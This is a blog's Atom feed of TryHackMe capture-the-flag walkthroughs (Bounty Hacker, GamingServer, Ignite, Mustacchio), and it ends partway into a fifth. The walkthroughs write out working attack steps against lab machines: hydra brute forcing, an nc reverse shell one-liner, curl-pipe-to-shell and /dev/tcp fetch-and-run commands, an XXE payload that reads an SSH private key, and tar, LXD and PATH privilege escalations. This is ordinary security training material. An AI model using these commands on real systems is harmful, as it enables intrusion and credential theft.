<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-23T17:09:41+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>

<p>Let’s start.</p>

<p><br /></p>

<h2 id="1-living-up-to-the-title">1. Living up to the title.</h2>

<p>You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they’d take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers &amp; beef in your future!</p>

<p><br /></p>

<h3 id="11-deploy-the-machine">1.1 Deploy the machine.</h3>

<h3 id="12-find-open-ports-on-the-machine">1.2 Find open ports on the machine</h3>

<p>Let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/bounty-hacker/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, and 80/tcp HTTP</code></strong>.</p>

<p>But first, let’s check the website running on port 80. 
Here is a page like this.</p>

<p><img src="/assets/img/tryhackme/bounty-hacker/home.png" alt="home" /></p>

<p>I’ve been browsing this site  but haven’t found anything remarkable.</p>

<p>We don’t have anything on website . Let’s run a gobuster scan and see what we can find. 
I couldn’t find anything.</p>

<h3 id="13-who-wrote-the-task-list">1.3 Who wrote the task list?</h3>

<p>We see anonymous FTP login is allowed. So we login to the FTP server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ftp anonymous@10.10.231.70
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/bounty-hacker/ftp.png" alt="ftp" /></p>

<p>We see two files here. One of them is <strong><code class="language-plaintext highlighter-rouge">locks.txt</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">task.txt</code></strong>. Let’s get this file on our machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ get locks.txt
$ get task.txt
</code></pre></div></div>

<p>Let’s take a look at what is inside these files.</p>

<p>locks.txt : This file is a password list.</p>

<ul>
  <li><img src="/assets/img/tryhackme/bounty-hacker/locks.png" alt="locks" /></li>
</ul>

<p>task.txt : This file is Lin’s notes.</p>

<ul>
  <li><img src="/assets/img/tryhackme/bounty-hacker/task.png" alt="task" /></li>
</ul>

<p>Now, we have a username and list of passwords that we can use to ssh brute force.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: lin</code></strong></p>

<p><br /></p>

<h3 id="14-what-service-can-you-bruteforce-with-the-text-file-found">1.4 What service can you bruteforce with the text file found?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: ssh</code></strong></p>

<p><br /></p>

<h3 id="15-what-is-the-users-password">1.5 What is the users password?</h3>

<p>Let’s do ssh brute force.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hydra -l lin -P locks.txt 10.10.231.70 -t 4 ssh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/bounty-hacker/hydra.png" alt="hydra" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: RedDr4gonSynd1cat3</code></strong></p>

<p><br /></p>

<h3 id="16-usertxt">1.6 user.txt</h3>

<p>We found Lin’s ssh password. Let’s login to ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh lin@10.10.231.70
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/bounty-hacker/sshin.png" alt="sshin" /></p>

<p>Now we can reach the user flag. Let’s get it.</p>

<p><img src="/assets/img/tryhackme/bounty-hacker/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="16-roottxt">1.6 root.txt</h3>

<p>Now, we need privilege escalation. So, I try the first <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command. I entered the password and here it is.</p>

<p><img src="/assets/img/tryhackme/bounty-hacker/sudo.png" alt="sudo" /></p>

<p>As far as I can see, we can get root privileges using tar. I’m looking at <a href="https://gtfobins.github.io/gtfobins/tar/">gtfobins</a>. and we found this.</p>

<p><img src="/assets/img/tryhackme/bounty-hacker/gtfobins.png" alt="gtfobins" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 
</code></pre></div></div>

<p>And we got root privilege. Now we can get to the root flag. Let’s get it.</p>

<p><img src="/assets/img/tryhackme/bounty-hacker/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="linux," /><category term="tar," /><category term="privesc" /><summary type="html"><![CDATA[You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>

<p><br /></p>

<h2 id="1-gaming-server">1. Gaming Server</h2>

<p>Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.</p>

<p><br /></p>

<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>

<p>Let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH, and 80/tcp HTTP</code></strong>. 
But first, let’s check the website running on port 80. 
Here is a page like this.</p>

<p><img src="/assets/img/tryhackme/gamingserver/home.png" alt="home" /></p>

<p>I’ve been browsing through other links on the site but haven’t found anything remarkable. Let’s take a look at the source of the page.</p>

<p><img src="/assets/img/tryhackme/gamingserver/source.png" alt="source" /></p>

<p>We found a name here, maybe we can use it for ssh.</p>

<p>We don’t have anything else. Let’s run a gobuster scan and see what we can find.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.225.113  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/gobuster.png" alt="gobuster" /></p>

<p>We discovered two directories. Let’s see what we can find in these directories.</p>

<p>First I go to the /uploads/ directory.</p>

<p><img src="/assets/img/tryhackme/gamingserver/uploads.png" alt="uploads" /></p>

<p>As you can see, there are 3 files.</p>

<p>dict.lst : It looks like a password list. We can try ssh brute force for John.</p>

<ul>
  <li><img src="/assets/img/tryhackme/gamingserver/dict.png" alt="dict" /></li>
</ul>

<p>Manifesto.txt : Something like a poem or song. Nothing noteworthy.</p>

<ul>
  <li><img src="/assets/img/tryhackme/gamingserver/manifesto.png" alt="manifesto" /></li>
</ul>

<p>meme.jpg :  :D</p>

<ul>
  <li><img src="/assets/img/tryhackme/gamingserver/meme.png" alt="meme" /></li>
</ul>

<p>Now let’s go to the /secret/ directory and check it out.</p>

<p><img src="/assets/img/tryhackme/gamingserver/secret.png" alt="secret" /></p>

<p>We found a secretKey file, let’s see what it says.</p>

<p><img src="/assets/img/tryhackme/gamingserver/rsa.png" alt="rsa" /></p>

<p>Hah, we probably found the RSA key file for john 
We can crack this RSA key and enter ssh with the password we reach.</p>

<p>First, let’s copy the secretKey and create the id_rsa file.</p>

<p><img src="/assets/img/tryhackme/gamingserver/pass.png" alt="pass" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano id_rsa
$ ssh2john id_rsa &gt; id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
</code></pre></div></div>

<p><strong><code class="language-plaintext highlighter-rouge">Password: letmein</code></strong></p>

<p>Now we can log in to ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
$ ssh -i id_rsa john@10.10.225.113
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/in.png" alt="in" /></p>

<p>Now we can get to the user flag.</p>

<p><img src="/assets/img/tryhackme/gamingserver/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-roottxt">1.2 Root.txt</h3>

<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>

<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python -m http.server 80
</code></pre></div></div>

<p>Then I run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/run.png" alt="run" /></p>

<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>

<p><img src="/assets/img/tryhackme/gamingserver/linpeas.png" alt="linpeas" /></p>

<p>I think we found something about lxd. I don’t know if I can upgrade authorization using this. So I started researching.</p>

<p>Yes, I found a way to escalate, let’s do it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ ./build-alpine 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/alpine.png" alt="alpine" /></p>

<p>After building, we need to send one of the <code class="language-plaintext highlighter-rouge">*.tar.gz</code> files created on our machine to the target machine.</p>

<p><img src="/assets/img/tryhackme/gamingserver/tar.png" alt="tar" /></p>

<p>For this, I run the following code on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -m http.server 80
</code></pre></div></div>

<p>This code on the target machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.8.86.168/alpine-v3.13-x86_64-20210218_0139.tar.gz
</code></pre></div></div>

<p>Then we continue on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
$ lxd init # hepsine enter tıklayıp geç.
$ lxc init myimage mycontainer -c security.privileged=true
$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
$ lxc start mycontainer
$ lxc exec mycontainer /bin/sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/privesc.png" alt="privesc" /></p>

<p>We can get to the root flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name root.txt 2&gt;/dev/null
$ cat /mnt/root/rot/root.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gamingserver/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>

<p><br /></p>

<h2 id="1-ignite">1. Ignite</h2>

<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>

<p><br /></p>

<h3 id="11-usertxt">1.1 User.txt</h3>

<p>Let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap" /></p>

<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>

<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots" /></p>

<p>But first, let’s check the website running on port 80. 
Here is a page like this.</p>

<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home" /></p>

<p>As far as I can see, the fuel cms version 1.4 is used here.
There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
Let’s go to this directory and see what comes up.</p>

<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login" /></p>

<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>

<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel" /></p>

<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>

<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search" /></p>

<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>

<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db" /></p>

<p>I’m downloading the exploit file from here. And now let’s run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload" /></p>

<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey’s reverse shells</a>.</p>

<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey" /></p>

<p>First, we set up a netcat listener on our own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Then we enter the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
</code></pre></div></div>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in" /></p>

<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
$ ls -la /home/www-data
$ cat /home/www-data/user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-roottxt">1.2 Root.txt</h3>

<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>

<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
</code></pre></div></div>

<p>Then I run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run" /></p>

<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>

<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Password: mememe</code></strong></p>

<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>

<p>First, let’s call a shell using python. Then let’s try logging in.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
$ su root
Password: mememe
</code></pre></div></div>

<p>It worked :D. We have successfully rooted.</p>

<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc" /></p>

<p>Now we can get to root.txt let’s get the flag.</p>

<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Mustacchio</title><link href="http://localhost:4000/tryhackme-mustacchio/" rel="alternate" type="text/html" title="TryHackMe - Mustacchio" /><published>2023-03-19T00:00:00+03:00</published><updated>2023-03-19T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-mustacchio</id><content type="html" xml:base="http://localhost:4000/tryhackme-mustacchio/"><![CDATA[<p>Easy boot2root Machine. Let’s start.</p>

<p><br /></p>

<h2 id="1-mustacchio">1. Mustacchio</h2>

<p>Deploy and compromise the machine!</p>

<p><br /></p>

<h3 id="11-user-flag">1.1 User Flag?</h3>

<p><em>Hint: Check the source of the page.</em></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap" /></p>

<p>We found three open ports. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP</code>.</p>

<p>First, let’s visit the website running on port 80/tcp and see what we can find.
Five different pages appear. These are home, about, gallery, blog, and contact.</p>

<p><img src="/assets/img/tryhackme/mustacchio/home.png" alt="home" /></p>

<p>I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.</p>

<p>I decided to do a directory scan with Gobuster. But first, let’s visit the website running on 8765/tcp port.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admin.png" alt="admin" /></p>

<p>We found an admin panel, it will help us. Anyway, let’s go back to port 80/tcp and do a gobuster scan.</p>

<p><img src="/assets/img/tryhackme/mustacchio/gobuster.png" alt="gobuster" /></p>

<p>The custom directory looks interesting. When we go inside, we find a file called <code class="language-plaintext highlighter-rouge">user.bak</code>, which is interesting.</p>

<p><img src="/assets/img/tryhackme/mustacchio/userbak.png" alt="userbak" /></p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/admincode.png" alt="admincode" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></strong></p>

<p>I guess this is the login information to the admin panel but the password seems to be encrypted. 
I check with the hash-identifier.</p>

<p><img src="/assets/img/tryhackme/mustacchio/codeid.png" alt="codeid" /></p>

<p>Most likely admin’s password is encrypted using <code class="language-plaintext highlighter-rouge">SHA1</code>.</p>

<p>You can decrypt online from any website by searching for “SHA1 decrypt” in the browser. I used the following website. <a href="https://md5decrypt.net/en/Sha1/#answer">Here</a></p>

<p><img src="/assets/img/tryhackme/mustacchio/decode.png" alt="decode" /></p>

<p>We found the password.</p>

<p><strong><code class="language-plaintext highlighter-rouge">admin : bulldog19</code></strong></p>

<p>Now let’s go to the admin panel and log in.
We logged in.</p>

<p><img src="/assets/img/tryhackme/mustacchio/comment.png" alt="comment" /></p>

<p>I’ve tried a few command injections into the area that comes up, but it just seems like a gimmick.</p>

<p>I’m checking the source of the page and we’re getting some important information here.</p>
<ul>
  <li>
    <p>We explore the /auth/dontforget.bak file.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/dontforget.png" alt="dontforget" /></p>
  </li>
  <li>
    <p>We discover that Barry is now able to log into SSH.</p>
  </li>
  <li>
    <p><img src="/assets/img/tryhackme/mustacchio/barryssh.png" alt="barryssh" /></p>
  </li>
</ul>

<p>Let’s first check the dontforget.bak file.</p>

<p>Download directly from here <a href="http://10.10.80.114:8765/auth/dontforget.bak">http://10.10.80.114:8765/auth/dontforget.bak</a>.</p>

<p>Something like this welcomes us.</p>

<p><img src="/assets/img/tryhackme/mustacchio/dontforgetbakin.png" alt="dontforgetbakin" /></p>

<p>But there is one important thing about this code, it’s not a complete waste of time. 
This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/joe.png" alt="joe" /></p>

<p>I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.</p>

<p>I tried the commands <a href="https://github.com/payloadbox/xxe-injection-payload-list">here</a> but no result.</p>

<p>But I realized something, I was constantly getting this result.</p>

<p><img src="/assets/img/tryhackme/mustacchio/empty.png" alt="empty" /></p>

<p>Here I understood that I should use the tags in dontforget.bak.</p>

<p>First I decided to give it a try with the code below.</p>

<p><img src="/assets/img/tryhackme/mustacchio/try.png" alt="try" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;&amp;example;&lt;/author&gt;
&lt;com&gt;Test paragraph&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/tryout.png" alt="tryout" /></p>

<p>It worked as you can see. Now we can access the information inside the system.</p>

<p>We got the message that Barry can now log in to ssh, if we go to Barry’s directory and get the rsa key, we can log in too.</p>

<p>I run the following code in the admin panel to get the id_rsa key.</p>

<p><img src="/assets/img/tryhackme/mustacchio/commentinssh.png" alt="commentinssh" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;
&lt;comment&gt;
  &lt;name&gt;Joe Hamd&lt;/name&gt;
  &lt;author&gt;Joe&lt;/author&gt;
&lt;com&gt;&amp;example;&lt;/com&gt;
&lt;/comment&gt;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/outrsa.png" alt="outrsa" /></p>

<p>Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn’t work :D.
Make sure there are no spaces at the end of the lines. Each one should be a separate line.
It should look like this when you edit it.</p>

<p><img src="/assets/img/tryhackme/mustacchio/edit.png" alt="edit" /></p>

<p>Now we need to crack this id_rsa for barry’s ssh password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john id_rsa &gt; id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/crack.png" alt="crack" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">barry : urieljames</code></strong></p>

<p>Now we can log in ssh.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 id_rsa
$ ssh -i id_rsa barry@10.10.80.114
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/barryin.png" alt="barryin" /></p>

<p>And we are inside.</p>

<p>Now we can access the user flag.</p>

<p><img src="/assets/img/tryhackme/mustacchio/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-root-flag">1.2 Root Flag?</h3>

<p><em>Hint: SUID?</em></p>

<p>We proceed with the clue that the question gives us. First, we will run the following code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/suid.png" alt="suid" /></p>

<p>I couldn’t find anything remarkable and started navigating the system.</p>

<p>I discovered the joe directory next to barry, and if you remember a file like <code class="language-plaintext highlighter-rouge">live_log</code> in it, we also saw this file as a result of the code we wrote above.</p>

<p><img src="/assets/img/tryhackme/mustacchio/ls.png" alt="ls" /></p>

<p>I’m looking at the strings content of this log file and we find something remarkable here. The tail command was used.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$strings live_log
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/mustacchio/strings.png" alt="strings" /></p>

<p>I’ve been doing some research on how to escalate using this and I find that it’s as follows.</p>

<p><img src="/assets/img/tryhackme/mustacchio/privesc.png" alt="privesc" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "/bin/sh" &gt; tail
$ chmod 777 tail
$ export PATH=/tmp.$PATH
$ cd /home/joe/
$ ./live_log
</code></pre></div></div>

<p>And we are inside. To be frank, I don’t fully understand the logic of raising authority, I’ll go over it a little later.
But now we can get to root.txt.</p>

<p><img src="/assets/img/tryhackme/mustacchio/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>

<p><br /></p>

<h2 id="1-pre-engagement-briefing">1. Pre-Engagement Briefing</h2>

<p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.</p>

<p>Scope of Work</p>

<p>The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>

<ul>
  <li>User.txt</li>
  <li>Root.txt</li>
</ul>

<p>Additionally, the client has provided the following scope allowances:</p>

<ul>
  <li>Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first</li>
  <li>Locate and note all vulnerabilities found</li>
  <li>Submit the flags discovered to the dashboard</li>
  <li>Only the IP address assigned to your machine is in scope</li>
  <li>Find and report ALL vulnerabilities (yes, there is more than one path to root)</li>
</ul>

<p>(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.</p>

<p>Note - Nothing in this room requires Metasploit</p>

<p>Machine may take up to 5 minutes for all services to start.</p>

